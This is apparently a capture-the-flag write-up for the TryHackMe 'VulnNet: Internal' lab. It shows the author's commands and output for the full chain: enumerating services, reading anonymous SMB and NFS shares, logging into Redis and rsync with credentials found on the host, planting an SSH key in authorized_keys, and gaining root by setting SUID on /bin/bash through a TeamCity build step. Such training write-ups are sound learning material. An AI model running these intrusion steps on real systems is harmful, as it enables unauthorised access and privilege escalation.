# VulnNet : Interne

VulnNet Entertainment is a company that learns from its mistakes. It quickly realised that it was unable to create a properly secure web application and therefore abandoned the project. Instead, it opted to set up internal services for commercial purposes. As usual, your task is to carry out a penetration test on their network and write a report.

![image.png](image.png)

# Enumeration

## Nmap

```jsx
PORT      STATE SERVICE     REASON         VERSION

22/tcp    open  ssh         syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 73:d9:77:79:61:61:d7:b3:1f:51:37:5e:e2:6a:fa:be (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5ChQfLpb4LxxayvZ8AQgBGO2maRN+hUMU/eE6TJRKlihmFC4g2qSXxYLt2kiKf0LcqgbAyHTLNmcI/6o6C4hPjtz7ztggNt/ZCtQMbiD3EcwNPFUpyQO7IpqJpvnJfsEpUiWTobKpo5bJiyPlz4fdfOr2O58HtW2LLRnUJiEmspOoZqlU0I1dKgAX99pCD+yXE7K+63cWQwSvSzM7NNxzwvfUYg1Wgu5MffYrITBRzIf19OSpDS43zireXy02YrYPb9He9f3sMlXaxsk0xStSFhzNuz9d4UP1rBS73I7FyfWbfu/eyzl6Z5DLdKGCWjgb/ntHBWJvnJuJP++iqxO+U1U6pIZuPRv2ziy8L5v7pX5KtJza2YXHiRD379nGZSk8PyoQi9tYrhpIJqUq5DLuV9Y8q1EnraWZz5zMYH5oiDIRMgtaYKXoycDzBvpxAcYzCZYMWcgkFZENXnTItHy75L4RfWGq6siJh4yvFloVNXa7ZOS7hdIN8NJnfpNo4+k=
|   256 90:b6:5e:9d:03:7d:0a:39:9b:6b:62:3e:26:7d:6f:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA2sRb+su3RGh2DuCfGmuXsBWFMDSPk0Xj45y9g/VkHHPNm7IiBwvC+aVAqhsmMWIJ22IG8nUD7yiGUClrKjm+s=
|   256 d2:7f:26:85:ea:bb:3a:8c:cd:7b:9d:dd:e3:45:ae:de (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPUPscZ2IvRoaCEvBPIUDd7Ab+uJQpsRPQD/pmEHrvwN

111/tcp   open  rpcbind     syn-ack ttl 62 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      32859/udp6  mountd
|   100005  1,2,3      42067/tcp6  mountd
|   100005  1,2,3      48276/udp   mountd
|   100005  1,2,3      54983/tcp   mountd
|   100021  1,3,4      40569/tcp   nlockmgr
|   100021  1,3,4      40975/tcp6  nlockmgr
|   100021  1,3,4      55066/udp6  nlockmgr
|   100021  1,3,4      60789/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl

139/tcp   open  netbios-ssn syn-ack ttl 62 Samba smbd 4
445/tcp   open  netbios-ssn syn-ack ttl 62 Samba smbd 4

873/tcp   open  rsync       syn-ack ttl 62 (protocol version 31)
2049/tcp  open  nfs         syn-ack ttl 62 3-4 (RPC #100003)
6379/tcp  open  redis       syn-ack ttl 62 Redis key-value store
34195/tcp open  java-rmi    syn-ack ttl 62 Java RMI
39929/tcp open  mountd      syn-ack ttl 62 1-3 (RPC #100005)
40569/tcp open  nlockmgr    syn-ack ttl 62 1-4 (RPC #100021)
46371/tcp open  mountd      syn-ack ttl 62 1-3 (RPC #100005)
54983/tcp open  mountd      syn-ack ttl 62 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63220/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19466/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64605/udp): CLEAN (Failed to receive data)
|   Check 4 (port 17045/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-03-26T00:53:44
|_  start_date: N/A
|_clock-skew: -2s
| nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   <00>                 Flags: <unique><active>
|   <03>                 Flags: <unique><active>
|   <20>                 Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>

| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
```

## rpcbind ( port 111/tcp)

### List of registered RPC services

```jsx
 ┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
 └─$ rpcinfo -p 10.129.164.204

   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  56876  mountd
    100005    1   tcp  57241  mountd
    100005    2   udp  48858  mountd
    100005    2   tcp  33853  mountd
    100005    3   udp  33408  mountd
    100005    3   tcp  49731  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100003    3   udp   2049  nfs
    100227    3   udp   2049  nfs_acl
    100021    1   udp  47652  nlockmgr
    100021    3   udp  47652  nlockmgr
    100021    4   udp  47652  nlockmgr
    100021    1   tcp  41149  nlockmgr
    100021    3   tcp  41149  nlockmgr
    100021    4   tcp  41149  nlockmgr
    
```

Checking anonymous access

We have successfully gained anonymous access, so the server permits null session access (SMB)

```jsx
rpcclient -U "" -N 10.129.164.204
rpcclient $> 
```

### Information you provide

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ rpcclient -U "" -N 10.129.164.204
rpcclient $> srvinfo
        IP-10-129-164-2Wk Sv PrQ Unx NT SNT ip-10-129-164-204 server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

```

### List of shares and permissions

- There is an SMB share named 'shares’
- It points to C:\opt\shares
- It may be accessible, depending on the permissions

```jsx
rpcclient $> netshareenum
netname: shares
        remark: VulnNet Business Shares
        path:   C:\opt\shares
        password:
rpcclient $> 

```

## SMB (445)

### List of shared items

We have anonymous read-only access to the share

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ smbmap -H 10.129.164.204        
                                                                                                                  
[+] IP: 10.129.164.204:445      Name: 10.129.164.204            Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        shares                                                  READ ONLY       VulnNet Business Shares
        IPC$                                                    NO ACCESS       IPC Service (ip-10-129-164-204 server (Samba, Ubuntu))
[*] Closed 1 connections                                                                                                     

```

### Anonyme Access

We have successfully connected to the share  

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ smbclient //10.129.164.204/shares -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb  2 10:20:09 2021
  ..                                  D        0  Tue Feb  2 10:28:11 2021
  temp                                D        0  Sat Feb  6 12:45:10 2021
  data                                D        0  Tue Feb  2 10:27:33 2021

                15376180 blocks of size 1024. 2252128 blocks available
smb: \> 

```

### Data exfiltration

We have retrieved the services.txt file located in the temp folder

```jsx

smb: \temp\> dir
  .                                   D        0  Sat Feb  6 12:45:10 2021
  ..                                  D        0  Tue Feb  2 10:20:09 2021
  services.txt                        N       38  Sat Feb  6 12:45:09 2021

                15376180 blocks of size 1024. 2030696 blocks available
smb: \temp\> get services.txt
getting file \temp\services.txt of size 38 as services.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \temp\> 

```

We have also extracted the data contained in the data directory

```jsx
smb: \data\> dir
  .                                   D        0  Tue Feb  2 10:27:33 2021
  ..                                  D        0  Tue Feb  2 10:20:09 2021
  data.txt                            N       48  Tue Feb  2 10:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 10:27:33 2021

                15376180 blocks of size 1024. 2022692 blocks available
smb: \data\> mget *
Get file data.txt? y
getting file \data\data.txt of size 48 as data.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
Get file business-req.txt? y
getting file \data\business-req.txt of size 190 as business-req.txt (0.7 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \data\> 

```

We can retrieve the service flag

![image.png](image%201.png)

## NFS ( port  2049 )

### List of shared items

The server exposes a single NFS share at /opt/conf

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ showmount -e 10.129.164.204                        
Export list for 10.129.164.204:
/opt/conf 
```

### Montge anonyme du partage

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ sudo mount -t nfs 10.129.144.29:/opt/conf  /tmp/nfs -o nolock
[sudo] password for hackthus: 
                                                                                                                                      
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ ls /tmp/nfs
hp  init  opt  profile.d  redis  vim  wildmidi

```

We have probably found a Redis configuration file 

```jsx
┌──(hackthus💀kali)-[/tmp/nfs]
└─$ ls -al redis           
total 68
drwxr-xr-x 2 root root  4096 Feb  2  2021 .
drwxr-xr-x 9 root root  4096 Feb  2  2021 ..
-rw-r--r-- 1 root root 58922 Feb  2  2021 redis.conf
```

## redis

### Access Anonyme

Authentication is required to access the Redis instance 

```jsx
┌──(hackthus💀kali)-[~]
└─$ redis-cli -h 10.128.164.40
10.128.164.40:6379> info
NOAUTH Authentication required.
```

The password is defined in the Redis configuration file, but there is no username defined. It is set to "B65Hx562F@ggAZ@F", which means we can log in using just the password.

![image.png](image%202.png)

We managed to log in successfully using the password 

![image.png](image%203.png)

### Enumeration redis database

```jsx
# Keyspace
db0:keys=5,expires=0,avg_ttl=0
10.128.164.40:6379> INFO keyspace
# Keyspace                                                                                                                            
db0:keys=5,expires=0,avg_ttl=0                                                                                                        
10.128.164.40:6379> SELECT 0
OK                                                                                                                                    
(2.30s)                                                                                                                               
10.128.164.40:6379> KEYS *
1) "internal flag"
2) "tmp"
3) "authlist"
4) "marketlist"
5) "int"
10.128.164.40:6379> TYPE internal flag
(error) ERR wrong number of arguments for 'type' command
10.128.164.40:6379> TYPE 'internal flag'
string
```

We have dumped the "internal flag" key to obtain the internal flag

![image.png](image%204.png)

Data encoded in Base64 within the key "authlist"

"QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="

![image.png](image%205.png)

Data decoding via Cyberchef 

 Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v

This appears to be the login details for the rsync service (username = rsync-connect and password = Hcg3HP67@TW@Bc72v)

![image.png](image%206.png)

## rsync

Log in to the service using the credentials obtained when decoding the data 

A directory that shares files

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ rsync rsync://rsync-connect@10.128.164.40
files           Necessary home interaction
                                                                                                                                                             

```

Let’s list the contents of the shared folder

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ rsync rsync://rsync-connect@10.128.164.40/files
Password: 
drwxr-xr-x          4,096 2026/03/29 18:27:32 .
drwxr-xr-x          4,096 2025/06/28 18:16:36 ssm-user
drwxr-xr-x          4,096 2021/02/06 13:49:29 sys-internal
drwxr-xr-x          4,096 2026/03/29 18:27:32 ubuntu
```

We retrieve the shared folder locally

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ rsync -av rsync://rsync-connect@10.128.164.40/files ./rsyn_shared 
Password: 
receiving incremental file list
created directory ./rsyn_shared
./
ssm-user/
ssm-user/.bash_logout
ssm-user/.bashrc
ssm-user/.profile
```

We have an `ubuntu/.ssh` directory; we may be able to retrieve an SSH key to log in to the system

![image.png](image%207.png)

The directory is empty; ubuntu/.ssh/ is empty 

![image.png](image%208.png)

### Exploring shared directories

![image.png](image%209.png)

We can retrieve the user flag

![image.png](image%2010.png)

We will generate an SSH key pair and transfer the public key to the target.

Transferring the public key to the target 

We will transfer our SSH public key to the target to gain SSH access

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ rsync -av id_rsa.pub rsync://rsync-connect@10.128.164.40/files/sys-internal/.ssh/authorized_keys         
Password: 
sending incremental file list
id_rsa.pub

sent 682 bytes  received 35 bytes  204.86 bytes/sec
total size is 567  speedup is 0.79
```

We now log in using the private key and gain SSH access to the target

![image.png](image%2011.png)

# Post-Exploitation

## Enumeration

We are exploring ways to elevate privilege 

![image.png](image%2012.png)

We have identified services that run locally 

![image.png](image%2013.png)

### PortForwarding

We have set up an SSH tunnel that forwards local port 8111 to port 8111 on 127.0.0.1 on the remote machine 10.128.164.40

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Vulnet-Internal]
└─$ ssh -L 8111:127.0.0.1:8111 -i id_rsa sys-internal@10.128.164.40
```

![image.png](image%2014.png)

After checking port 8111 on the remote machine, we discovered a TeamCity connection service running version 2020.2.2 (build 85899)

![                                                       Login Page](image%2015.png)

                                                       Login Page

Search for exploits

No exploits available for this specific version of TeamCity

![image.png](image%2016.png)

  /login.html?super=1 pointing to an administration portal protected by a token 

![                Connexion super-utilisateur avec jeton d'authentification](image%2017.png)

                Connexion super-utilisateur avec jeton d'authentification

After listing the files, the token was found in the TeamCity directory at the root of the system

![image.png](image%2018.png)

![image.png](image%2019.png)

We managed to log in to the admin panel using the token: 4153186897034338543 

This is generated randomly, so yours will probably be different.

![image.png](image%2020.png)

Once we have access, we will manually create a new project 

![image.png](image%2021.png)

![image.png](image%2022.png)

We added a compilation step by setting SUID permissions on /bin/bash using the command `chmod +s /bin/bash`, which will allow us to elevate privileges from our SSH connection. Once the configuration was complete, we clicked ‘Save’ to save the settings.

![image.png](image%2023.png)

We then started the compilation

![image.png](image%2024.png)

The operation was a success

![image.png](image%2025.png)

Now, within our SSH session, we have run the following command: `/bin/bash -p` to escalate privileges to the root user

![image.png](image%2026.png)

We can retrieve the root user flag

![image.png](image%2027.png)

THE END

By Mr Hackthus :-)